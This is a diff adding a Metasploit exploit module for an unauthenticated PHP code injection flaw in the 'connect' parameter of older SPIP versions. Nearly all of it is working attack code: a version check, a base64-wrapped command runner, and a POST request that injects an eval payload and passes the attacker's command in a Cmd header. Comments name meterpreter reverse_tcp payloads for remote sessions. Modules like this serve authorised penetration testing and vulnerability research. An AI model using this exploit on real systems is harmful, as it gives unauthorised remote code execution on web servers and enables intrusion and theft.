@@ -1,0 +1,130 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Payload::Php
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::Spip
+  prepend Msf::Exploit::Remote::AutoCheck
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'SPIP connect Parameter PHP Injection',
+        'Description' => %q{
+          This module exploits a PHP code injection vulnerability in SPIP. The vulnerability exists
+          in the connect parameter, allowing an unauthenticated user to execute arbitrary commands
+          with web user privileges. Branches 2.0, 2.1, and 3 are affected. Vulnerable versions are
+          < 2.0.21, < 2.1.16, and < 3.0.3. This module is compatible with both Unix/Linux and Windows
+          platforms, and has been successfully tested on SPIP 2.0.11 and SPIP 2.0.20 on Apache running
+          on Ubuntu, Fedora, and Windows Server.
+        },
+        'Author' => [
+          'Arnaud Pachot',    # Initial discovery
+          'Frederic Cikala',  # PoC
+          'Davy Douhine',     # PoC and MSF module
+          'Valentin Lobstein' # Added Windows compatibility and code rewrite
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          ['OSVDB', '83543'],
+          ['BID', '54292'],
+          ['URL', 'http://contrib.spip.net/SPIP-3-0-3-2-1-16-et-2-0-21-a-l-etape-303-epate-la']
+        ],
+        'Privileged' => false,
+        'Platform' => %w[php unix linux win],
+        'Arch' => [ARCH_PHP, ARCH_CMD],
+        'Targets' => [
+          [
+            'PHP In-Memory',
+            {
+              'Platform' => 'php',
+              'Arch' => ARCH_PHP
+              # tested with php/meterpreter/reverse_tcp
+            }
+          ],
+          [
+            'Unix/Linux Command Shell',
+            {
+              'Platform' => %w[unix linux],
+              'Arch' => ARCH_CMD
+              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
+            }
+          ],
+          [
+            'Windows Command Shell',
+            {
+              'Platform' => 'win',
+              'Arch' => ARCH_CMD
+              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
+            }
+          ]
+        ],
+        'DefaultTarget' => 0,
+        'DisclosureDate' => '2012-07-04',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS]
+        }
+      )
+    )
+  end
+
+  def check
+    rversion = spip_version || spip_plugin_version('spip')
+    return Exploit::CheckCode::Unknown('Unable to determine the version of SPIP') unless rversion
+
+    print_status("SPIP Version detected: #{rversion}")
+
+    vulnerable_ranges = [
+      { start: '2.0.0', end: '2.0.20' },
+      { start: '2.1.0', end: '2.1.15' },
+      { start: '3.0.0', end: '3.0.2' }
+    ]
+
+    vulnerable_ranges.each do |range|
+      if rversion.between?(Rex::Version.new(range[:start]), Rex::Version.new(range[:end]))
+        return Exploit::CheckCode::Appears
+      end
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def php_exec_cmd(encoded_payload)
+    vars = Rex::RandomIdentifier::Generator.new
+    dis = '$' + vars[:dis]
+    encoded_clean_payload = Rex::Text.encode_base64(encoded_payload)
+    shell = <<-END_OF_PHP_CODE
+        #{php_preamble(disabled_varname: dis)}
+        $c = base64_decode("#{encoded_clean_payload}");
+        #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
+    END_OF_PHP_CODE
+    return shell
+  end
+
+  def exploit
+    uri = normalize_uri(target_uri.path, 'spip.php')
+    print_status("#{rhost}:#{rport} - Attempting to exploit...")
+
+    phped_payload = target['Arch'] == ARCH_PHP ? payload.encoded : php_exec_cmd(payload.encoded)
+
+    send_request_cgi(
+      'uri' => uri,
+      'method' => 'POST',
+      'vars_post' => {
+        'connect' => '<?php eval(base64_decode($_SERVER[HTTP_CMD]));?>'
+      },
+      'headers' => {
+        'Cmd' => Rex::Text.encode_base64(phped_payload)
+      }
+    )
+  end
+
+end
